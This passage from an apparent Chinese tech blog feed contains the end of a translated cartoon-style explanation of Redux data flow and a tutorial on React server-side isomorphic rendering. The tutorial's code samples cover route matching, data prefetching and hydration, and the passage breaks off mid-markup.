<li><p>  connect()：这是 react-redux 提供的一个方法。如果一个组件想要响应状态的变化，就把自己作为参数传给 connect() 的结果（译者注：connect() 返回的依然是一个函数），connect() 方法会处理与 store 绑定的细节，并通过 selector 确定该绑定 store 中哪一部分的数据。</p>
</li>
<li><p>  selector：这是你自己编写的一个函数。这个函数声明了你的组件需要整个 store 中的哪一部分数据作为自己的 props。</p>
</li>
</ul>
<p><strong>根组件</strong></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-4fc845e2d3d245ec?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>所有的 React 应用都存在一个根组件（root component）。他其实就是整个组件树最外层的那个组件，但是在 Redux 中，根组件还要承担额外的任务。</p>
<p>根组件承担的角色有点像企业中的高管，他将整个团队整合到一起来完成某项任务。他会创建 store，并告诉 store 使用哪些 reducers，并最终完成视图层的绑定。</p>
<p>当完成整个应用的初始化工作后，根组件的就不再插手整个应用的运行过程了。每一次重新渲染（re-render）都没有根组件什么事，这些活儿都由根组件下面的子组件完成，当然也少不了视图层绑定的功劳。</p>
<p><strong>Redux 完成的运行流程</strong></p>
<p>让我们看看上述各个部分是怎样组合成一个可以运行的应用的。</p>
<p>配置环节</p>
<p>应用中的不同部分需要在配置环节中整合到一起。</p>
<p>(1) <em>准备好 store。</em>根组件会创建 store，并通过 createStore(reducer) 方法告诉 store 该使用哪个根 reducer。与此同时，根 reducer 也通过 combineReducers() 方法组建了一只向自己汇报的 reducer 团队。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d832b0601951193b?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>(2) 设置 store 和组件之间的通信。根组件将它所有的子组件包裹在 <Provider> 组件中，并建立了 Provider 与 store 之间的联系。</p>
<p>Provider 本质上创建了一个用于更新视图组件的网络。那些智能组件通过 connect() 方法连入这个网络，以此确保他们能够获取到状态的更新。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-2e61200b7ac1ff04?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>(3) 准备好 action callback。为了让木偶组件更好的处理 action，智能组件可以用 bindActionCreators() 方法来创建 action callback。这样做之后，智能组件就能给木偶组件传入一个回调（callback）。对应的 action 会在木偶组件调用这个回调时被自动 dispatch。（译者注：使用 bindActionCreators() 使得木偶组件无需关心 action 的 type 等信息，只用调用 props 中的某个方法传入需要的参数作为 action 的 payload 即可）</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7828e3bec86d30b1?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>数据流</p>
<p>现在我们的应用已经配置完成，用户可以开始操作了。让我们触发一个 action，看看数据是怎样流动的。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8c1cdc1cf3fe7bc5?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>(1) 视图发出了一个 action，action creator 将这个 action 格式化并返回。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-bb9e6ab545305bf2?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>(2) 这个 action 要么被自动 dispatch（如果我们在配置阶段使用了 bindActionCreators()），要么由视图层手动 dispatch。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-ab9825b546237dbb?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>(3) store 接受到这个 action 后，将当前的状态树和这个 action 传给根 reducer。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-38ee22f1100d5ea1?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>(4) 根 reducer 将整个状态树切分成一个个小块，然后将某一个小块分发给知道怎么处理这部分内容的子reducer。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-4e631ac8c3fc1aa3?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>(5) 子 reducer 将传入的一小块状态树进行拷贝，然后在副本上进行修改，并最终将修改后的副本返回根reducer。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d38dc2f1f3e9a481?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>(6) 当所有的子 reducer 返回他们修改的副本之后，根 reducer 将这些部分再次组合起来形成一颗新的状态树。然后根 reducer 将这个新的状态树交还给 store，store 再把自己的状态置为这个最新的状态树。 </p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-5248c07e0a0acebd?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>(7) store 告诉视图层绑定：「状态更新啦」</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8ce27928c4bfb166?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>(8) 视图层绑定让 store 把更新的状态传过来</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-eaa10bbd70692251?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>(9) 视图层绑定触发了一个重新渲染的操作（re-render）</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-93fd1b32145e7df1?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>这就是我所理解的 Redux，希望对你有所帮助。</p>
<p><strong>更多资源</strong></p>
<ul>
<li><p>  Redux 官方文档</p>
</li>
<li><p>  Redux 官方文档中文版</p>
</li>
<li><p>  The Evolutionof Flux Frameworks</p>
</li>
<li><p>  Smart andDumb Components</p>
</li>
<li><p>  The upsides of using Redux</p>
</li>
<li><p>  The downsides of using Redux</p>
</li>
<li><p>  如何评价数据流管理架构 Redux?</p>
</li>
</ul>
<p>关于本文</p>
<blockquote>
<p>译者：@ jasonslyvia<br>原文连接：<a href="http://jasonslyvia.github.io/a-cartoon-intro-to-redux-cn/">http://jasonslyvia.github.io/a-cartoon-intro-to-redux-cn/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>一文吃透React SSR服务端同构渲染</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E4%B8%80%E6%96%87%E5%90%83%E9%80%8FReactSSR%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%90%8C%E6%9E%84%E6%B8%B2%E6%9F%93/</url>
    <content><![CDATA[<h1 id="为什么要服务端渲染-ssr"><a href="#为什么要服务端渲染-ssr" class="headerlink" title="为什么要服务端渲染(ssr)"></a>为什么要服务端渲染(ssr)</h1><p>至于为什么要服务端渲染，我相信大家都有所闻，而且每个人都能说出几点来。</p>
<h2 id="首屏等待"><a href="#首屏等待" class="headerlink" title="首屏等待"></a>首屏等待</h2><p>在 SPA 模式下，所有的数据请求和 Dom 渲染都在浏览器端完成，所以当我们第一次访问页面的时候很可能会存在“白屏”等待，而服务端渲染所有数据请求和 html内容已在服务端处理完成，浏览器收到的是完整的 html 内容，可以更快的看到渲染内容，在服务端完成数据请求肯定是要比在浏览器端效率要高的多。</p>
<h2 id="没考虑seo的感受"><a href="#没考虑seo的感受" class="headerlink" title="没考虑seo的感受"></a>没考虑seo的感受</h2><p>有些网站的流量来源主要还是靠搜索引擎，所以网站的 seo 还是很重要的，而 SPA 模式对搜索引擎不够友好，要想彻底解决这个问题只能采用服务端直出。改变不了别人（搜索yinqing），只能改变自己。</p>
<h2 id="SSR-SPA-体验升级"><a href="#SSR-SPA-体验升级" class="headerlink" title="SSR + SPA 体验升级"></a>SSR + SPA 体验升级</h2><p>只实现 SSR 其实没啥意义，技术上没有任何发展和进步，否则 SPA 技术就不会出现。但是单纯的 SPA又不够完美，所以最好的方案就是这两种体验和技术的结合，第一次访问页面是服务端渲染，基于第一次访问后续的交互就是 SPA 的效果和体验，还不影响SEO 效果，这就有点完美了。单纯实现 ssr 很简单，毕竟这是传统技术，也不分语言，随便用 php 、jsp、asp、node 等都可以实现。但是要实现两种技术的结合，同时可以最大限度的重用代码（同构），减少开发维护成本，那就需要采用 react 或者 vue等前端框架相结合 node (ssr) 来实现。</p>
<p>本文主要说 React SSR 技术 ,当然 vue 也一样，只是技术栈不同而已。</p>
<h1 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h1><p>整体来说 react 服务端渲染原理不复杂，其中最核心的内容就是同构。</p>
<p>node server 接收客户端请求，得到当前的req url path,然后在已有的路由表内查找到对应的组件，拿到需要请求的数据，将数据作为 props、context或者store 形式传入组件，然后基于 react 内置的服务端渲染api renderToString() or renderToNodeStream() 把组件渲染为 html字符串或者 stream 流, 在把最终的 html 进行输出前需要将数据注入到浏览器端(注水)，server 输出(response)后浏览器端可以得到数据(脱水)，浏览器开始进行渲染和节点对比，然后执行组件的componentDidMount 完成组件内事件绑定和一些交互，浏览器重用了服务端输出的 html 节点，整个流程结束。</p>
<p>技术点确实不少，但更多的是架构和工程层面的，需要把各个知识点进行链接和整合。这里放一个架构图：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-ba28fc3e201b3ca0.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h1 id="react-ssr"><a href="#react-ssr" class="headerlink" title="react ssr"></a>react ssr</h1><h2 id="从-ejs-开始"><a href="#从-ejs-开始" class="headerlink" title="从 ejs 开始"></a>从 ejs 开始</h2><p>实现 ssr 很简单，先看一个 node ejs的栗子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; index.html</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">   &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">   &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">   &lt;title&gt;react ssr &lt;%&#x3D; title %&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;%&#x3D;  data %&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &#x2F;&#x2F;node ssr</span><br><span class="line"> const ejs &#x3D; require(&#39;ejs&#39;);</span><br><span class="line"> const http &#x3D; require(&#39;http&#39;);</span><br><span class="line"></span><br><span class="line">http.createServer((req, res) &#x3D;&gt; &#123;</span><br><span class="line">    if (req.url &#x3D;&#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">        res.writeHead(200, &#123;</span><br><span class="line">            &#39;Content-Type&#39;: &#39;text&#x2F;html&#39; </span><br><span class="line">        &#125;);</span><br><span class="line">        &#x2F;&#x2F; 渲染文件 index.ejs</span><br><span class="line">        ejs.renderFile(&#39;.&#x2F;views&#x2F;index.ejs&#39;, &#123;</span><br><span class="line">            title: &#39;react ssr&#39;, </span><br><span class="line">            data: &#39;首页&#39;&#125;, </span><br><span class="line">            (err, data) &#x3D;&gt; &#123;</span><br><span class="line">            if (err ) &#123;</span><br><span class="line">                console.log(err);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                res.end(data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).listen(8080);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="jsx-到字符串"><a href="#jsx-到字符串" class="headerlink" title="jsx 到字符串"></a>jsx 到字符串</h2><p>上面我们结合 ejs模板引擎 ，实现了一个服务端渲染的输出，html 和 数据直接输出到客户端。参考以上，我们结合 react组件 来实现服务端渲染直出，使用 jsx 来代替 ejs，之前是在 html 里使用 ejs 来绑定数据，现在改写成使用jsx 来绑定数据,使用 react 内置 api 来把组件渲染为 html 字符串，其他没有差别。</p>
<p>为什么react 组件可以被转换为 html字符串呢？简单的说我们写的 jsx 看上去就像在写 html（其实写的是对象） 标签，其实经过编译后都会转换成React.createElement方法，最终会被转换成一个对象(虚拟DOM)，而且和平台无关，有了这个对象，想转换成什么那就看心情了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const  React  &#x3D; require(&#39;react&#39;);</span><br><span class="line"></span><br><span class="line">const &#123; renderToString&#125;  &#x3D; require( &#39;react-dom&#x2F;server&#39;);</span><br><span class="line"></span><br><span class="line">const http &#x3D; require(&#39;http&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;组件</span><br><span class="line">class Index extends React.Component&#123;</span><br><span class="line">    constructor(props)&#123;</span><br><span class="line">        super(props);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render()&#123;</span><br><span class="line">        return &lt;h1&gt;&#123;this.props.data.title&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;模拟数据的获取</span><br><span class="line">const fetch &#x3D; function () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">        title:&#39;react ssr&#39;,</span><br><span class="line">        data:[]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;服务</span><br><span class="line">http.createServer((req, res) &#x3D;&gt; &#123;</span><br><span class="line">    if (req.url &#x3D;&#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">        res.writeHead(200, &#123;</span><br><span class="line">            &#39;Content-Type&#39;: &#39;text&#x2F;html&#39;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        const data &#x3D; fetch();</span><br><span class="line"></span><br><span class="line">        const html &#x3D; renderToString(&lt;Index data&#x3D;&#123;data&#125;&#x2F;&gt;);</span><br><span class="line">        res.end(html);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).listen(8080);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>ps</strong>:以上代码不能直接运行，需要结合babel 使用 @babel/preset-react 进行转换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npx babel script.js --out-file script-compiled.js --presets&#x3D;@babel&#x2F;preset-react</span><br></pre></td></tr></table></figure>

<h1 id="引出问题"><a href="#引出问题" class="headerlink" title="引出问题"></a>引出问题</h1><p>在上面非常简单的就是实现了 react ssr ,把jsx作为模板引擎，不要小看上面的一小段代码，他可以帮我们引出一系列的问题，这也是完整实现 react ssr 的基石。</p>
<ul>
<li>  双端路由如何维护？</li>
</ul>
<p>首先我们会发现我在 server 端定义了路由 ‘/‘，但是在 react SPA 模式下我们需要使用react-router来定义路由。那是不是就需要维护两套路由呢？</p>
<ul>
<li>  获取数据的方法和逻辑写在哪里？</li>
</ul>
<p>发现数据获取的fetch 写的独立的方法，和组件没有任何关联，我们更希望的是每个路由都有自己的 fetch 方法。</p>
<ul>
<li>  服务端 html 节点无法重用</li>
</ul>
<p>虽然组件在服务端得到了数据，也能渲染到浏览器内，但是当浏览器端进行组件渲染的时候直出的内容会一闪而过消失。</p>
<p>好了，问题有了，接下来我们就一步一步的来解决这些问题。</p>
<h1 id="同构才是核心"><a href="#同构才是核心" class="headerlink" title="同构才是核心"></a>同构才是核心</h1><p>react ssr 的核心就是同构，没有同构的 ssr 是没有意义的。</p>
<p>所谓同构就是采用一套代码，构建双端（server 和 client）逻辑，最大限度的重用代码，不用维护两套代码。而传统的服务端渲染是无法做到的，react 的出现打破了这个瓶颈，并且现在已经得到了比较广泛的应用。</p>
<h2 id="路由同构"><a href="#路由同构" class="headerlink" title="路由同构"></a>路由同构</h2><p>双端使用同一套路由规则，node server 通过req url path 进行组件的查找，得到需要渲染的组件。</p>
<p>//组件和路由配置 ，供双端使用 routes-config.js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Detail extends React.Component&#123;</span><br><span class="line">    render()&#123;</span><br><span class="line">        return &lt;div&gt;detail&lt;&#x2F;div&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Index extends React.Component &#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">        return &lt;div&gt;index&lt;&#x2F;div&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const routes &#x3D; [</span><br><span class="line">            &#123;</span><br><span class="line">                path: &quot;&#x2F;&quot;,</span><br><span class="line">                exact: true,</span><br><span class="line">                component: Home</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                path: &#39;&#x2F;detail&#39;, exact: true,</span><br><span class="line">                component:Detail,</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                path: &#39;&#x2F;detail&#x2F;:a&#x2F;:b&#39;, exact: true,</span><br><span class="line">                component: Detail</span><br><span class="line">            &#125; </span><br><span class="line">];</span><br><span class="line">&#x2F;&#x2F;导出路由表</span><br><span class="line">export default routes;</span><br></pre></td></tr></table></figure>

<p>//客户端 路由组件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import routes from &#39;.&#x2F;routes-config.js&#39;;</span><br><span class="line">function App()&#123;</span><br><span class="line">    return (</span><br><span class="line">        &lt;Layout&gt;</span><br><span class="line">            &lt;Switch&gt;</span><br><span class="line">                        &#123;</span><br><span class="line">                            routes.map((item,index)&#x3D;&gt;&#123;</span><br><span class="line">                                return &lt;Route path&#x3D;&#123;item.path&#125; key&#x3D;&#123;index&#125; exact&#x3D;&#123;item.exact&#125; render&#x3D;&#123;item.component&#125;&gt;&lt;&#x2F;Route&gt;</span><br><span class="line">                            &#125;)</span><br><span class="line">                        &#125;</span><br><span class="line">            &lt;&#x2F;Switch&gt;</span><br><span class="line">        &lt;&#x2F;Layout&gt;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure>

<p><strong>node server 进行组件查找</strong></p>
<p>路由匹配其实就是对 组件path 规则的匹配，如果规则不复杂可以自己写，如果情况很多种还是使用官方提供的库来完成。</p>
<p><strong>matchRoutes(routes, pathname)</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;引入官方库</span><br><span class="line">import &#123; matchRoutes &#125; from &quot;react-router-config&quot;;</span><br><span class="line">import routes from &#39;.&#x2F;routes-config.js&#39;;</span><br><span class="line"></span><br><span class="line">const path &#x3D; req.path;</span><br><span class="line"></span><br><span class="line">const branch &#x3D; matchRoutes(routes, path);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;得到要渲染的组件</span><br><span class="line">const Component &#x3D; branch[0].route.component;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;node server </span><br><span class="line">http.createServer((req, res) &#x3D;&gt; &#123;</span><br><span class="line"></span><br><span class="line">        const url &#x3D; req.url;</span><br><span class="line">        &#x2F;&#x2F;简单容错，排除图片等资源文件的请求</span><br><span class="line">        if(url.indexOf(&#39;.&#39;)&gt;-1) &#123; res.end(&#39;&#39;); return false;&#125;</span><br><span class="line"></span><br><span class="line">        res.writeHead(200, &#123;</span><br><span class="line">            &#39;Content-Type&#39;: &#39;text&#x2F;html&#39;</span><br><span class="line">        &#125;);</span><br><span class="line">        const data &#x3D; fetch();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;查找组件</span><br><span class="line">        const branch &#x3D;  matchRoutes(routes,url);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;得到组件</span><br><span class="line">        const Component &#x3D; branch[0].route.component;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;将组件渲染为 html 字符串</span><br><span class="line">        const html &#x3D; renderToString(&lt;Component data&#x3D;&#123;data&#125;&#x2F;&gt;);</span><br><span class="line"></span><br><span class="line">        res.end(html);</span><br><span class="line"></span><br><span class="line"> &#125;).listen(8080);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看下matchRoutes方法的返回值,其中route.component 就是 要渲染的组件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123; </span><br><span class="line"></span><br><span class="line">    route:</span><br><span class="line">        &#123; path: &#39;&#x2F;detail&#39;, exact: true, component: [Function: Detail] &#125;,</span><br><span class="line">    match:</span><br><span class="line">        &#123; path: &#39;&#x2F;detail&#39;, url: &#39;&#x2F;detail&#39;, isExact: true, params: &#123;&#125; &#125; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>react-router-config 这个库由react 官方维护，功能是实现嵌套路由的查找，代码没有多少，有兴趣可以看看。</p>
<p><strong>文章走到这里，相信你已经知道了路由同构，所以上面的第一个问题 ： 【双端路由如何维护？】 解决了。</strong></p>
<h2 id="数据同构（预取同构）"><a href="#数据同构（预取同构）" class="headerlink" title="数据同构（预取同构）"></a>数据同构（预取同构）</h2><p>这里开始解决我们最开始发现的第二个问题 - 【获取数据的方法和逻辑写在哪里？】</p>
<p>数据预取同构，解决双端如何使用同一套数据请求方法来进行数据请求。</p>
<p>先说下流程，在查找到要渲染的组件后，需要预先得到此组件所需要的数据，然后将数据传递给组件后，再进行组件的渲染。</p>
<p>我们可以通过给组件定义静态方法来处理，组件内定义异步数据请求的方法也合情合理，同时声明为静态（static），在 server 端和组件内都也可以直接通过组件（function） 来进行访问。</p>
<p>比如 Index.getInitialProps</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;组件</span><br><span class="line">class Index extends React.Component&#123;</span><br><span class="line">    constructor(props)&#123;</span><br><span class="line">        super(props);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;数据预取方法  静态 异步 方法</span><br><span class="line">    static async  getInitialProps(opt) &#123;</span><br><span class="line">        const fetch1 &#x3D;await fetch(&#39;&#x2F;xxx.com&#x2F;a&#39;);</span><br><span class="line">        const fetch2 &#x3D; await fetch(&#39;&#x2F;xxx.com&#x2F;b&#39;);</span><br><span class="line"></span><br><span class="line">        return &#123;</span><br><span class="line">            res:[fetch1,fetch2]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render()&#123;</span><br><span class="line">        return &lt;h1&gt;&#123;this.props.data.title&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;node server </span><br><span class="line">http.createServer((req, res) &#x3D;&gt; &#123;</span><br><span class="line"></span><br><span class="line">        const url &#x3D; req.url;</span><br><span class="line">        if(url.indexOf(&#39;.&#39;)&gt;-1) &#123; res.end(&#39;&#39;); return false;&#125;</span><br><span class="line"></span><br><span class="line">        res.writeHead(200, &#123;</span><br><span class="line">            &#39;Content-Type&#39;: &#39;text&#x2F;html&#39;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;组件查找</span><br><span class="line">        const branch &#x3D;  matchRoutes(routes,url);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;得到组件</span><br><span class="line">        const Component &#x3D; branch[0].route.component;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;数据预取</span><br><span class="line">        const data &#x3D; Component.getInitialProps(branch[0].match.params);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;传入数据，渲染组件为 html 字符串</span><br><span class="line">        const html &#x3D; renderToString(&lt;Component data&#x3D;&#123;data&#125;&#x2F;&gt;);</span><br><span class="line"></span><br><span class="line">        res.end(html);</span><br><span class="line"></span><br><span class="line"> &#125;).listen(8080);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>另外还有在声明路由的时候把数据请求方法关联到路由中，比如定一个 loadData 方法，然后在查找到路由后就可以判断是否存在loadData这个方法。</p>
<p>看下参考代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">const loadBranchData &#x3D; (location) &#x3D;&gt; &#123;</span><br><span class="line">  const branch &#x3D; matchRoutes(routes, location.pathname)</span><br><span class="line"></span><br><span class="line">  const promises &#x3D; branch.map((&#123; route, match &#125;) &#x3D;&gt; &#123;</span><br><span class="line">    return route.loadData</span><br><span class="line">      ? route.loadData(match)</span><br><span class="line">      : Promise.resolve(null)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  return Promise.all(promises)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面这种方式实现上没什么问题，但从职责划分的角度来说有些不够清晰，我还是比较喜欢直接通过组件来得到异步方法。</p>
<p>好了，到这里我们的第二个问题 - 【获取数据的方法和逻辑写在哪里？】 解决了。</p>
<h2 id="渲染同构"><a href="#渲染同构" class="headerlink" title="渲染同构"></a>渲染同构</h2><p>假设我们现在基于上面已经实现的代码，同时我们也使用 webpack 进行了配置，对代码进行了转换和打包，整个服务可以跑起来。</p>
<p>路由能够正确匹配，数据预取正常，服务端可以直出组件的 html ，浏览器加载 js 代码正常，查看网页源代码能看到 html 内容，好像我们的整个流程已经走完。</p>
<p>但是当浏览器端的 js 执行完成后，发现数据重新请求了，组件的重新渲染导致页面看上去有些闪烁。</p>
<p>这是因为在浏览器端，双端节点对比失败，导致组件重新渲染，也就是只有当服务端和浏览器端渲染的组件具有相同的props 和 DOM 结构的时候，组件才能只渲染一次。</p>
<p>刚刚我们实现了双端的数据预取同构，但是数据也仅仅是服务端有，浏览器端是没有这个数据，当客户端进行首次组件渲染的时候没有初始化的数据，渲染出的节点肯定和服务端直出的节点不同，导致组件重新渲染。</p>
<h3 id="数据注水"><a href="#数据注水" class="headerlink" title="数据注水"></a>数据注水</h3><p>在服务端将预取的数据注入到浏览器，使浏览器端可以访问到，客户端进行渲染前将数据传入对应的组件即可，这样就保证了props的一致。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;node server  参考代码</span><br><span class="line">http.createServer((req, res) &#x3D;&gt; &#123;</span><br><span class="line"></span><br><span class="line">        const url &#x3D; req.url;</span><br><span class="line">        if(url.indexOf(&#39;.&#39;)&gt;-1) &#123; res.end(&#39;&#39;); return false;&#125;</span><br><span class="line"></span><br><span class="line">        res.writeHead(200, &#123;</span><br><span class="line">            &#39;Content-Type&#39;: &#39;text&#x2F;html&#39;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        console.log(url);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;查找组件</span><br><span class="line">        const branch &#x3D;  matchRoutes(routes,url);</span><br><span class="line">        &#x2F;&#x2F;得到组件</span><br><span class="line">        const Component &#x3D; branch[0].route.component;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;数据预取</span><br><span class="line">        const data &#x3D; Component.getInitialProps(branch[0].match.params);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;组件渲染为 html</span><br><span class="line">        const html &#x3D; renderToString(&lt;Component data&#x3D;&#123;data&#125;&#x2F;&gt;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;数据注水</span><br><span class="line">        const propsData &#x3D; &#96;&lt;textarea id&#x3D;&quot;krs-server-render-data-BOX&quot;&gt;$&#123;JSON.stringify(data)&#125;&lt;&#x2F;textarea&gt;&#96;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 通过 ejs 模板引擎将数据注入到页面</span><br><span class="line">        ejs.renderFile(&#39;.&#x2F;index.html&#39;, &#123;</span><br><span class="line">            htmlContent: html,  </span><br><span class="line">            propsData</span><br><span class="line">        &#125;,  &#x2F;&#x2F; 渲染的数据key: 对应到了ejs中的index</span><br><span class="line">            (err, data) &#x3D;&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    console.log(err);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    console.log(data);</span><br><span class="line">                    res.end(data);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line"> &#125;).listen(8080);</span><br><span class="line"></span><br><span class="line"> &#x2F;&#x2F;node ejs html</span><br><span class="line"></span><br><span class="line"> &lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;rootEle&quot;&gt;</span><br><span class="line">        &lt;%- htmlContent %&gt; &#x2F;&#x2F;组件 html内容</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;%- propsData %&gt; &#x2F;&#x2F;组件 init  state ，现在是个字符串</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span 